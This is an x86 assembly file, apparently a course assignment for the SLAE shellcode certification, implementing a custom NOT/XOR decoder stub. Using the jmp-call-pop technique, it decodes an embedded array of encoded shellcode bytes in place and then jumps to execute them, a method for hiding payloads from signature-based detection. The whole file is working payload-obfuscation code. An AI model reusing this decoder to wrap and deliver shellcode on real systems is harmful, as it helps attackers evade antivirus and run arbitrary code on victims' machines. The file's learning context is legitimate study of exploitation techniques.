; SLAE Assigment4 - Custom encoder
; Author: rtmcx (rtmcx@protonmail.com)
;
; NOT/XOR decoder


global _start

section .text
_start: 
	; Put shellcode on stack by "jump-call-pop"
	jmp short push_shellcode 

decoder:
	pop esi				; Put shellcode-address in esi
	
	xor ecx, ecx		; zero out ecx
	mov cl, sc_length	; length of shellcode, used as counter
decode: 
	mov edx, ecx		; save counter
	and edx, 1			; (Byte position) modulo 2 (to get if its a even or uneven position)
 
	cmp edx, 1			; is it odd?
	je not_decode 		; No, even, so this is a "Not"

	xor byte [esi], cl	; Odd, "XOR"
	jmp cont			; Step over the "not"-decode for this byte

not_decode:	
	not byte [esi]		; 'NOT'-decode

cont:	
	inc esi				; next byte
	loop decode			; loop until all bytes in array
			
	jmp short shellcode	; All decoded, Jump to decoded shellcode and exec...

push_shellcode:
	call decoder
	shellcode: db 0xce,0xd8,0xaf,0x7e,0x91,0x3b,0x8c,0x7a,0x97,0x3f,0xd0,0x6c,0x96,0x85,0x1c,0x5a,0x76,0xea,0xac,0x8f,0x1e,0xb4,0xf4,0xcf,0x7f
	sc_length equ $-shellcode